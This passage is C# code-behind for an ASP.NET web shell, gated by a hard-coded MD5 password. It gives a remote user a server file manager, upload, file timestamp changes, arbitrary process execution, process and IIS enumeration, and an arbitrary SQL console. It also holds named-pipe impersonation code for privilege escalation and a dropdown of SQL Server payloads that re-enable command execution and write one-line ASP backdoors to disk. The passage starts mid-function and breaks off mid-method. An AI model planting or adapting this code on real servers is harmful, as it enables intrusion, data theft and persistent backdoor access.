            Response.Write("- Error Getting User Info<br>");

            Response.End();

        }

        Response.Output.Write("+ Connection From Client: {0}<br>", userName);



        // assume the identity of the client //

        Response.Write("+ Impersonating client...<br>");

        if (!ImpersonateNamedPipeClient(hPipe)) {

            Response.Write("- Failed to impersonate the named pipe.<br>");

            CloseHandle(hPipe);

            Response.End();

        }





        CloseHandle(hPipe);





    }



protected void K_SQLRequestButton_Click(object sender, EventArgs e)

    {



    String pipeName = "\\\\.\\pipe\\" + txtPipeName.Text;

    String command = "exec master..xp_commshell 'dir > \\\\127.0.0.1\\pipe\\" + txtPipeName.Text + "'";



    // Make a local sql request to the pipe

    

    String connectionString = "server=127.0.0.1;database=master;uid=" + txtSQLUser.Text + ";password=" + txtSQLPass.Text;



    // create a new SqlConnection object with the appropriate connection string 

    SqlConnection sqlConn = new SqlConnection(connectionString);



        Response.Output.Write("+ Sending {0}<br>", command);

        // open the connection 

        sqlConn.Open();



    // do some operations ...

    // create the command object 

    SqlCommand sqlComm = new SqlCommand(command, sqlConn);

        sqlComm.ExecuteNonQuery();

        // close the connection

        sqlConn.Close();

    }

        public string Password = "21232f297a57a5a743894a0e4a801fc3"; //admin
        public string SessionName = "H0bb1t";
        public string K_Action = "";
        public string K_Request = "";
        protected OleDbConnection conn = new OleDbConnection();
        protected OleDbCommand comm = new OleDbCommand();
        
        protected void Page_Load(object sender, EventArgs e)
    {
        //set up enter to submit 
        K_commPanel.DefaultButton = "K_RunButton";

        if (Session[SessionName] != "BIN") {
            K_login();
        }
        else {
            if (!IsPostBack) {
                K_main();
            }
            else {

                K_Action = Request["goaction"];
                if (K_Action == "del") {
                    K_Request = Request["todo"];
                    K_Filedel(K_Request, 1);
                }
                if (K_Action == "change") {
                    K_Request = Request["todo"];
                    K_FileList(K_Request);
                }
                if (K_Action == "deldir") {
                    K_Request = Request["todo"];
                    K_Filedel(K_Request, 2);
                }
                if (K_Action == "down") {
                    K_Request = Request["todo"];
                    K_Filedown(K_Request);
                }
                if (K_Action == "rename") {
                    K_Request = Request["todo"];
                    K_FileRN(K_Request, 1);
                }
                if (K_Action == "renamedir") {
                    K_Request = Request["todo"];
                    K_FileRN(K_Request, 2);
                }
                if (K_Action == "showatt") {
                    K_Request = Request["todo"];
                    K_Fileatt(K_Request);
                }
                if (K_Action == "edit") {
                    K_Request = Request["todo"];
                    K_FileEdit(K_Request);
                }
                if (K_Action == "postdata") {

                    K_Request = Request["todo"];
                    Session["K_Table"] = K_Request;
                    K_DataGrid.CurrentPageIndex = 0;
                    K_DBstrTextBox.Text = "";
                    K_Databind();
                }
                if (K_Action == "change_data") {
                    Session["K_Table"] = null;
                    K_Request = Request["todo"];
                    Session["K_Option"] = Request["intext"];
                    K_Change();
                    K_DBinfoLabel.Visible = false;
                    K_DBstrTextBox.Text = K_Request;

                }
                if (Session["K_Table"] != null) {
                    K_Databind();
                }

            }
        }
    }
        public void K_login()
    {
        K_LoginPanel.Visible = true;
        K_MainPanel.Visible = false;
        K_MenuPanel.Visible = false;
        K_FilePanel.Visible = false;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
        public void K_main()
    {
        TimeLabel.Text = DateTime.Now.ToString();
        K_PortPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_LoginPanel.Visible = false;
        K_MainPanel.Visible = true;
        K_MenuPanel.Visible = true;
        K_FilePanel.Visible = false;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_InteractivePanel.Visible = false;
            string ServerIP = "Server IP : " + Request.ServerVariables["LOCAL_ADDR"] + "<br>";
            string HostName = "HostName : " + Environment.MachineName + "<br>";
            string OS = "OS Version : " + Environment.OSVersion + "</br>";
            string IISversion = "IIS Version : " + Request.ServerVariables["SERVER_SOFTWARE"] + "<br>";
            string PATH_INFO = "PATH_TRANSLATED : " + Request.ServerVariables["PATH_TRANSLATED"] + "<br>";
        InfoLabel.Text = "<hr><center><b><U>SYS-INFO</U></B></center>";
        InfoLabel.Text += ServerIP + HostName + OS + IISversion + PATH_INFO + "<hr>";
        InfoLabel.Text += K_Process() + "<hr>";

    }
        private bool CheckIsNumber(string sSrc)
    {
        System.Text.RegularExpressions.Regex reg = new System.Text.RegularExpressions.Regex(@"^0|[0-9]*[1-9][0-9]*$");

        if (reg.IsMatch(sSrc)) {
            return true;
        }
        else {
            return false;
        }
    }
        public string K_iisinfo()
    {
            string iisinfo = "";
            string iisstart = "";
            string iisend = "";
            string iisstr = "IIS://localhost/W3SVC";
            int i = 0;
        try {
                DirectoryEntry mydir = new DirectoryEntry(iisstr);
            iisstart = "<input type=hidden name=goaction><input type=hidden name=todo><TABLE width=100% align=center border=0><TR align=center><TD width=6%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>";
            foreach(DirectoryEntry child in mydir.Children)
            {
                if (CheckIsNumber(child.Name.ToString())) {
                        string dirstr = child.Name.ToString();
                        string tmpstr = "";
                        DirectoryEntry newdir = new DirectoryEntry(iisstr + "/" + dirstr);
                        DirectoryEntry newdir1 = newdir.Children.Find("root", "IIsWebVirtualDir");
                    iisinfo += "<TR><TD align=center>" + (i = i + 1) + "</TD>";
                    iisinfo += "<TD align=center>" + newdir1.Properties["AnonymousUserName"].Value + "</TD>";
                    iisinfo += "<TD>" + child.Properties["ServerBindings"][0] + "</TD>";
                    iisinfo += "<TD><a href=javascript:Command('change','" + formatpath(newdir1.Properties["Path"].Value.ToString()) + "');>" + newdir1.Properties["Path"].Value + "</a></TD>";
                    iisinfo += "</TR>";
                }
            }
            iisend = "</TABLE><hr>";
        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
        return iisstart + iisinfo + iisend;
    }
        public string K_Process()
    {
            string htmlstr = "<center><b><U>PROCESS-INFO</U></B></center><TABLE width=80% align=center border=0><TR align=center><TD width=20%><B>ID</B></TD><TD align=left width=20%><B>Process</B></TD><TD align=left width=20%><B>MemorySize</B></TD><TD align=center width=10%><B>Threads</B></TD></TR>";
                string prostr = "";
                string htmlend = "</TR></TABLE>";
        try {
            Process[] myprocess = Process.GetProcesses();
            foreach(Process p in myprocess)
            {
                prostr += "<TR><TD align=center>" + p.Id.ToString() + "</TD>";
                prostr += "<TD align=left>" + p.ProcessName.ToString() + "</TD>";
                prostr += "<TD align=left>" + p.WorkingSet.ToString() + "</TD>";
                prostr += "<TD align=center>" + p.Threads.Count.ToString() + "</TD>";
            }
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        return htmlstr + prostr + htmlend;
    }
        protected void LoginButton_Click(object sender, EventArgs e)
    {
            string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(passtext.Text, "MD5").ToLower();
        if (MD5Pass == Password) {
            Session[SessionName] = "BIN";
            K_main();
        }
        else {
            K_login();
        }
    }
    
        protected void LogoutButton_Click(object sender, EventArgs e)
    {
        Session.Abandon();
        K_login();
    }
    
        protected void FileButton_Click(object sender, EventArgs e)
    {
        K_LoginPanel.Visible = false;
        K_MenuPanel.Visible = true;
        K_MainPanel.Visible = false;
        K_FilePanel.Visible = true;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_InteractivePanel.Visible = false;
        K_upTextBox.Text = formatpath(Server.MapPath("."));
        K_CopyTextBox.Text = formatpath(Server.MapPath("."));
        K_upTextBox.Text = formatpath(Server.MapPath("."));
        K_FileList(Server.MapPath("."));

    }
    
        protected void MainButton_Click(object sender, EventArgs e)
    {
        K_main();
    }
        public void K_DriveList()
    {
            string file = "<input type=hidden name=goaction><input type=hidden name=todo>";
        file += "<hr>Drives : ";
        string[] drivers = Directory.GetLogicalDrives();
        for (int i = 0; i < drivers.Length; i++)
        {
            file += "<a href=javascript:Command('change','" + formatpath(drivers[i]) + "');>" + drivers[i] + "</a>&nbsp;";
        }
        file += "    WebRoot :  <a href=javascript:Command('change','" + formatpath(Server.MapPath(".")) + "');>" + Server.MapPath(".") + "</a>";
        K_FileLabel.Text = file;
    }
    
        public void K_FileList(string K_path)
    {
        K_FilePanel.Visible = true;
        K_CreateTextBox.Text = "";
        K_CopytoTextBox.Text = "";
        K_CopyTextBox.Text = K_path;
        K_upTextBox.Text = K_path;
        K_IISPanel.Visible = false;
        K_DriveList();
            string tmpstr = "";
            string K_Filelist = K_FilelistLabel.Text;
        K_Filelist = "<hr>";
        K_Filelist += "<table width=90% border=0 align=center>";
        K_Filelist += "<tr><td width=40%><b>Name</b></td><td width=15%><b>Size(Byte)</b></td>";
        K_Filelist += "<td width=25%><b>ModifyTime</b></td><td width=25%><b>Operate</b></td></tr>";
        try {
            K_Filelist += "<tr><td>";
                string parstr = "";
            if (K_path.Length < 4) {
                parstr = formatpath(K_path);

            }
            else {
                parstr = formatpath(Directory.GetParent(K_path).ToString());

            }
            K_Filelist += "<i><b><a href=javascript:Command('change','" + parstr + "');>|Parent Directory|</a></b></i>";
            K_Filelist += "</td></tr>";
                
                DirectoryInfo K_dir = new DirectoryInfo(K_path);
            foreach(DirectoryInfo K_folder in K_dir.GetDirectories())
            {
                    string foldername = formatpath(K_path) + "/" + formatfile(K_folder.Name);
                tmpstr += "<tr>";
                tmpstr += "<td><a href=javascript:Command('change','" + foldername + "')>" + K_folder.Name + "</a></td><td><b><i>&lt;dir&gt;</i></b></td><td>" + Directory.GetLastWriteTime(K_path + "/" + K_folder.Name) + "</td><td><a href=javascript:Command('renamedir','" + foldername + "');>Ren</a>|<a href=javascript:Command('showatt','" + foldername + "/');>Att</a>|<a href=javascript:Command('deldir','" + foldername + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            foreach(FileInfo K_file in K_dir.GetFiles())
            {
                    string filename = formatpath(K_path) + "/" + formatfile(K_file.Name);
                tmpstr += "<tr>";
                tmpstr += "<td>" + K_file.Name + "</td><td>" + K_file.Length + "</td><td>" + Directory.GetLastWriteTime(K_path + "/" + K_file.Name) + "</td><td><a href=javascript:Command('edit','" + filename + "');>Edit</a>|<a href=javascript:Command('rename','" + filename + "');>Ren</a>|<a href=javascript:Command('down','" + filename + "');>Down</a>|<a href=javascript:Command('showatt','" + filename + "');>Att</a>|<a href=javascript:Command('del','" + filename + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            tmpstr += "</talbe>";
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);

        }

        K_FilelistLabel.Text = K_Filelist + tmpstr;
    }
        public void K_Filedel(string instr, int type)
    {
        try {
            if (type == 1) {
                File.Delete(instr);
            }
            if (type == 2) {
                foreach(string tmp in Directory.GetFileSystemEntries(instr))
                {
                    if (File.Exists(tmp)) {
                        File.Delete(tmp);
                    }
                    else {
                        K_Filedel(tmp, 2);
                    }
                }
                Directory.Delete(instr);
            }
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
    }
        public void K_FileRN(string instr, int type)
    {
        try {
            if (type == 1) {
                string[] array = instr.Split(',');

                File.Move(array[0], array[1]);
            }
            if (type == 2) {
                string[] array = instr.Split(',');
                Directory.Move(array[0], array[1]);
            }
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
    }
        public void K_Filedown(string instr)
    {
        try {
                FileStream MyFileStream = new FileStream(instr, FileMode.Open, FileAccess.Read, FileShare.Read);
                long FileSize = MyFileStream.Length;
            byte[] Buffer = new byte[(int)FileSize];
            MyFileStream.Read(Buffer, 0, (int)FileSize);
            MyFileStream.Close();
            Response.AddHeader("Content-Disposition", "attachment;filename=" + instr);
            Response.Charset = "UTF-8";
            Response.ContentType = "application/octet-stream";
            Response.BinaryWrite(Buffer);
            Response.Flush();
            Response.End();
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }

    }
        public void K_Fileatt(string instr)
    {
        K_AttPanel.Visible = true;
        K_FilePanel.Visible = true;
        try {
                string Att = File.GetAttributes(instr).ToString();
            K_ReadOnlyCheckBox.Checked = false;
            K_SystemCheckBox.Checked = false;
            K_HiddenCheckBox.Checked = false;
            K_ArchiveCheckBox.Checked = false;

            if (Att.LastIndexOf("ReadOnly") != -1) {
                K_ReadOnlyCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("System") != -1) {
                K_SystemCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Hidden") != -1) {
                K_HiddenCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Archive") != -1) {
                K_ArchiveCheckBox.Checked = true;
            }
            K_CreationTimeTextBox.Text = File.GetCreationTime(instr).ToString();
            K_LastWriteTimeTextBox.Text = File.GetLastWriteTime(instr).ToString();
            K_AccessTimeTextBox.Text = File.GetLastAccessTime(instr).ToString();
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_AttLabel.Text = instr;
        Session["FileName"] = instr;
        K_DriveList();
    }
        public void K_FileEdit(string instr)
    {
        K_FilePanel.Visible = true;
        K_EditPanel.Visible = true;
        K_DriveList();
        K_EditpathTextBox.Text = instr;
            StreamReader SR = new StreamReader(instr, Encoding.Default);
        K_EditTextBox.Text = SR.ReadToEnd();
        SR.Close();
    }
        protected void K_upButton_Click(object sender, EventArgs e)
    {
           
                string uppath = K_upTextBox.Text;
        if (uppath.Substring(uppath.Length - 1, 1) != @"/")
        {
            uppath = uppath + @"/";
        }
        try {
            K_UpFile.PostedFile.SaveAs(uppath + Path.GetFileName(K_UpFile.Value));

        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
        K_FileList(uppath);
    }
        public void K_Error(string error)
    {
        K_ErrorLabel.Text = "Error : " + error;
    }
        public string formatpath(string instr)
    {
        instr = instr.Replace(@"\", "/");
        if (instr.Length < 4) {
            instr = instr.Replace(@"/", "");
        }
        if (instr.Length == 2) {
            instr = instr + @"/";
        }
        instr = instr.Replace(" ", "%20");
        return instr;
    }
        public string formatfile(string instr)
    {
        instr = instr.Replace(" ", "%20");
        return instr;

    }
        protected void K_GoButton_Click(object sender, EventArgs e)
    {
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_NewFileButton_Click(object sender, EventArgs e)
    {
            string newfile = K_CreateTextBox.Text;
            string filepath = K_upTextBox.Text;
        filepath = filepath + "/" + newfile;
        try {
                StreamWriter sw = new StreamWriter(filepath, true, Encoding.Default);

        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_NewdirButton_Click(object sender, EventArgs e)
    {
            string dirpath = K_upTextBox.Text;
            string newdir = K_CreateTextBox.Text;
        newdir = dirpath + "/" + newdir;
        try {
            Directory.CreateDirectory(newdir);

        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_CopyButton_Click(object sender, EventArgs e)
    {
            string copystr = K_CopyTextBox.Text;
            string copyto = K_CopytoTextBox.Text;
        try {
            File.Copy(copystr, copyto);
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_CopytoTextBox.Text = "";
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_CutButton_Click(object sender, EventArgs e)
    {
            string copystr = K_CopyTextBox.Text;
            string copyto = K_CopytoTextBox.Text;
        try {
            File.Move(copystr, copyto);
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_CopytoTextBox.Text = "";
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_SetButton_Click(object sender, EventArgs e)
    {
        try {
                string FileName = Session["FileName"].ToString();
            File.SetAttributes(FileName, FileAttributes.Normal);
            if (K_ReadOnlyCheckBox.Checked) {
                File.SetAttributes(FileName, FileAttributes.ReadOnly);
            }

            if (K_SystemCheckBox.Checked) {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.System);
            }
            if (K_HiddenCheckBox.Checked) {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Hidden);
            }
            if (K_ArchiveCheckBox.Checked) {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Archive);
            }
            if (FileName.Substring(FileName.Length - 1, 1) == "/") {
                Directory.SetCreationTime(FileName, Convert.ToDateTime(K_CreationTimeTextBox.Text));
                Directory.SetLastWriteTime(FileName, Convert.ToDateTime(K_LastWriteTimeTextBox.Text));
                Directory.SetLastAccessTime(FileName, Convert.ToDateTime(K_AccessTimeTextBox.Text));
            }
            else {
                File.SetCreationTime(FileName, Convert.ToDateTime(K_CreationTimeTextBox.Text));
                File.SetLastWriteTime(FileName, Convert.ToDateTime(K_LastWriteTimeTextBox.Text));
                File.SetLastAccessTime(FileName, Convert.ToDateTime(K_AccessTimeTextBox.Text));
            }
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");
    }
    
        protected void K_EditButton_Click(object sender, EventArgs e)
    {
        try {
                StreamWriter SW = new StreamWriter(K_EditpathTextBox.Text, false, Encoding.Default);
            SW.Write(K_EditTextBox.Text);
            SW.Close();
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
        K_FileList(K_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");

    }
        
        protected void K_BackButton_Click(object sender, EventArgs e)
    {
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_SbackButton_Click(object sender, EventArgs e)
    {
        K_FileList(K_upTextBox.Text);
    }
    
        protected void K_commButton_Click(object sender, EventArgs e)
    {
        K_MenuPanel.Visible = true;
        K_LoginPanel.Visible = false;
        K_commPanel.Visible = true;
        K_SQLPanel.Visible = false;
        K_commLabel.Text = "";
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
        
        protected void K_InteractiveButton_Click(object sender, EventArgs e)
    {
        K_MenuPanel.Visible = true;
        K_LoginPanel.Visible = false;
        K_InteractivePanel.Visible = true;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_commPanel.Visible = false;
    }

        protected void K_RunButton_Click(object sender, EventArgs e)
    {
        try {
            Process commpro = new Process();
            commpro.StartInfo.FileName = K_commPathTextBox.Text;
            commpro.StartInfo.Arguments = K_commShellTextBox.Text;
            commpro.StartInfo.UseShellExecute = false;
            commpro.StartInfo.RedirectStandardInput = true;
            commpro.StartInfo.RedirectStandardOutput = true;
            commpro.StartInfo.RedirectStandardError = true;
            commpro.Start();
                string commstr = commpro.StandardOutput.ReadToEnd();
            commstr = commstr.Replace("<", "&lt;");
            commstr = commstr.Replace(">", "&gt;");
            K_commLabel.Text = "<hr><div id=\"comm\"><pre>" + commstr + "</pre></div>";
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
    }
    
        protected void K_SQLButton_Click(object sender, EventArgs e)
    {
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = true;
        K_LoginPanel.Visible = false;
        K_MenuPanel.Visible = true;
        K_AccPanel.Visible = false;
        K_Scroll.Visible = false;
        K_DBmenuPanel.Visible = false;
        K_dirPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
    
        protected void K_SQLRadioButton_CheckedChanged(object sender, EventArgs e)
    {
        Session["K_Table"] = null;
        K_SQLconnTextBox.Text = "server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB";
        K_SQLRadioButton.Checked = true;
        K_AccRadioButton.Checked = false;
        K_AccPanel.Visible = false;
        K_DataGrid.Visible = false;
        K_Scroll.Visible = false;
        K_DBmenuPanel.Visible = false;
        K_dirPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
    
        protected void K_AccRadioButton_CheckedChanged(object sender, EventArgs e)
    {
        Session["K_Table"] = null;
        K_SQLconnTextBox.Text = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\wwwroot\database.mdb";
        K_SQLRadioButton.Checked = false;
        K_AccRadioButton.Checked = true;
        K_DBmenuPanel.Visible = false;
        K_AccPanel.Visible = false;
        K_DataGrid.Visible = false;
        K_Scroll.Visible = false;
        K_dirPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
        protected void OpenConnection()
    {
        if (conn.State == ConnectionState.Closed) {
            try {
                conn.ConnectionString = K_SQLconnTextBox.Text;
                comm.Connection = conn;
                conn.Open();
            }
            catch (Exception Error)
            {
                K_Error(Error.Message);
            }
        }
    }
        protected void CloseConnection()
    {
        if (conn.State == ConnectionState.Open)
            conn.Close();
        conn.Dispose();
        comm.Dispose();
    }
        public DataTable K_DataTable(string sqlstr)
    {
            OleDbDataAdapter da = new OleDbDataAdapter();
            DataTable datatable = new DataTable();
        try {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = sqlstr;
            da.SelectCommand = comm;
            da.Fill(datatable);
        }
        catch (Exception) {
        }
        finally {
            CloseConnection();
        }
        return datatable;
    }
        protected void SQL_SumbitButton_Click(object sender, EventArgs e)
    {
        try {
            Session["K_Table"] = null;
            K_DataGrid.CurrentPageIndex = 0;
            K_DataGrid.AllowPaging = true;
            if (K_SQLRadioButton.Checked) {
                K_DBmenuPanel.Visible = true;
                K_DBinfoLabel.Visible = true;
                K_AccPanel.Visible = false;
                K_Scroll.Visible = false;
                K_dirPanel.Visible = false;
                OpenConnection();
                    DataTable ver = K_DataTable(@"SELECT @@VERSION");
                    DataTable dbs = K_DataTable(@"SELECT name FROM master.dbo.sysdatabases");
                    DataTable cdb = K_DataTable(@"SELECT DB_NAME()");
                    DataTable rol = K_DataTable(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
                    DataTable owner = K_DataTable(@"SELECT IS_MEMBER('db_owner')");
                    string dbo = "";
                if (owner.Rows[0][0].ToString() == "1") {
                    dbo = "db_owner";
                }
                else {
                    dbo = "public";
                }
                if (rol.Rows[0][0].ToString() == "1") {
                    dbo = "<font color=blue>sa</font>";
                }
                    string db_info = "";
                db_info = "<i><b><font color=red>SQLversion</font> : </b></i>" + ver.Rows[0][0].ToString() + "<br><hr>";
                    string db_name = "";
                for (int i = 0; i < dbs.Rows.Count; i++)
                {
                    db_name += dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(), "<font color=blue>" + cdb.Rows[0][0].ToString() + "</font>") + "&nbsp;|&nbsp;";
                }
                db_info += "<i><b><font color=red>DataBase</font> : </b></i><div style=\"width:760px;word-break:break-all\">" + db_name + "<br><div><hr>";
                db_info += "<i><b><font color=red>SRVROLEMEMBER</font></i></b> : " + dbo + "<hr>";
                K_DBinfoLabel.Text = db_info;
            }
            if (K_AccRadioButton.Checked) {
                K_DataGrid.Visible = false;
                K_SAexecButton.Visible = false;
                K_Accbind();
            }
        }
        catch (Exception E)
        {
            K_Error(E.Message);
        }
    }
        protected void K_Accbind()
    {
        try {
            K_DBmenuPanel.Visible = false;
            K_AccPanel.Visible = true;
            OpenConnection();
                DataTable acctable = new DataTable();
            acctable = conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, new Object[] { null, null, null, "Table" });
                string accstr = "<input type=hidden name=goaction><input type=hidden name=todo>";
            accstr += "Tables Count : " + acctable.Rows.Count + "<br>Please select a database : <SELECT onchange=if(this.value!='')Command('postdata',this);>";
            for (int i = 0; i < acctable.Rows.Count; i++)
            {
                accstr += "<option value=" + acctable.Rows[i].ItemArray[2].ToString() + ">" + acctable.Rows[i].ItemArray[2].ToString() + "</option>";
            }
            if (Session["K_Table"] != null) {
                accstr += "<option SELECTED>" + Session["K_Table"] + "</option>";
            }
            accstr += "</SELECT>";
            K_AccinfoLabel.Text = accstr;
            CloseConnection();
        }
        catch (Exception Error)
        {
            K_Error(Error.Message);
        }
    }
        protected void K_Databind()
    {
        try {
            K_SAexecButton.Visible = false;
            K_Accbind();
            K_Scroll.Visible = true;
            if (K_SQLRadioButton.Checked) {
                K_DBmenuPanel.Visible = true;
                K_DBinfoLabel.Visible = false;
            }
            K_DataGrid.Visible = true;
                DataTable databind = K_DataTable(@"SELECT * FROM " + Session["K_Table"]);
            K_DataGrid.DataSource = databind;
            K_DataGrid.DataBind();
        }
        catch (Exception Error)
        {

            K_Error(Error.Message);
        }
    }
    
        public void K_ExecSql(string instr)
    {
        try {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = instr;
            comm.ExecuteNonQuery();
        }
        catch (Exception e)
        {
            K_Error(e.Message);
        }
    }
        public void Item_DataBound(object sender, DataGridItemEventArgs e)
    {

        for (int i = 2; i < e.Item.Cells.Count; i++)
        {
            e.Item.Cells[i].Text = e.Item.Cells[i].Text.Replace("<", "&lt;").Replace(">", "&gt;");
        }

    }
       protected void K_DBPage(object sender, DataGridPageChangedEventArgs e)
    {
        K_DataGrid.CurrentPageIndex = e.NewPageIndex;
        K_Databind();
    }
        public void Item_Command(object sender, DataGridCommandEventArgs e)
    {
        if (e.CommandName == "Cancel") {
            K_DataGrid.EditItemIndex = -1;
            K_Databind();
        }
    }
    
        protected void K_ExecButton_Click(object sender, EventArgs e)
    {
        try {

            K_Scroll.Visible = true;
            K_DataGrid.Visible = true;
            K_DataGrid.AllowPaging = true;
            K_Accbind();
            if (K_SQLRadioButton.Checked) {
                K_DBmenuPanel.Visible = true;
            }
                string sqlstr = K_DBstrTextBox.Text;
            sqlstr = sqlstr.TrimStart().ToLower();
            if (sqlstr.Substring(0, 6) == "select") {
                    DataTable databind = K_DataTable(sqlstr);
                K_DataGrid.DataSource = databind;
                K_DataGrid.DataBind();
            }
            else {
                K_ExecSql(sqlstr);
                K_Databind();
            }
        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
    }
    
        protected void K_BDButton_Click(object sender, EventArgs e)
    {
        K_DBinfoLabel.Visible = false;
        K_Accbind();
        K_DBmenuPanel.Visible = true;
        K_DataGrid.Visible = false;
        K_DataGrid.AllowPaging = true;
        K_Scroll.Visible = false;
        K_DBstrTextBox.Text = "";
        K_SAexecButton.Visible = false;
        K_ResLabel.Visible = false;
        K_dirPanel.Visible = false;

    }
        
        protected void K_SAcommButton_Click(object sender, EventArgs e)
    {
        K_DBinfoLabel.Visible = false;
        K_DataGrid.Visible = false;
        K_Scroll.Visible = false;
        K_SAexecButton.Visible = true;
        K_Change();
        K_ExecButton.Visible = false;
        K_ResLabel.Visible = false;
        Session["K_Option"] = null;
        K_dirPanel.Visible = false;

    }
        public void K_Change()
    {
        K_ExecButton.Visible = false;
            string select = "<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=if(this.value!='')Command('change_data',this);><option>SQL Server Exec<option value=\"Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll')\">Add sp_oacreate<option value=\"Use master dbcc addextendedproc ('xp_commshell','xplog70.dll')\">Add xp_commshell<option value=\"Exec master.dbo.xp_commshell 'net user'\">Add xp_commshell<option value=\"EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_commshell', 1;RECONFIGURE;\">Add xp_commshell(SQL2005)<option value=\"Exec master.dbo.xp_commshell 'net user'\">XP_commshell exec<option value=\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'comm.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\1.asp';\">SP_oamethod exec<option value=\"sp_makewebtask @outputfile='d:\\web\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))" + "%" + ">''' \">SP_makewebtask make file";
        if (Session["K_Option"] != null) {
            select += "<option SELECTED>" + Session["K_Option"] + "</option>";
        }
        select += "</select>";
        K_AccinfoLabel.Text = select;
        K_DataGrid.Visible = false;
        K_Scroll.Visible = false;
    }
    
        protected void K_SAexecButton_Click(object sender, EventArgs e)
    {
        try {
            K_Change();
            K_DBinfoLabel.Visible = false;
            K_ExecButton.Visible = false;
            K_Scroll.Visible = false;
            K_DataGrid.Visible = false;
            K_DBmenuPanel.Visible = true;
                string sqlstr = K_DBstrTextBox.Text;
                DataTable databind = K_DataTable(sqlstr);
                string res = "";
            foreach(DataRow dr in databind.Rows)
            {
                for (int i = 0; i < databind.Columns.Count; i++)
                {
                    res += dr[i] + "\r";
                }
            }
            K_ResLabel.Text = "<hr><div id=\"nei\"><PRE>" + res.Replace(" ", "&nbsp;").Replace("<", "&lt;").Replace(">", "&gt;") + "</PRE></div>";


        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }

    }
    
        protected void K_DirButton_Click(object sender, EventArgs e)
    {
        K_dirPanel.Visible = true;
        K_AccPanel.Visible = false;
        K_DBinfoLabel.Visible = false;
        K_DataGrid.Visible = false;
        K_Scroll.Visible = false;
    }
        
        protected void K_listButton_Click(object sender, EventArgs e)
    {
        K_dirPanel.Visible = true;
        K_AccPanel.Visible = false;
        K_DBinfoLabel.Visible = false;
        K_SqlDir();
    }
        public void K_SqlDir()
    {
        try {
            K_DataGrid.Visible = true;
            K_Scroll.Visible = true;
            K_DataGrid.AllowPaging = false;
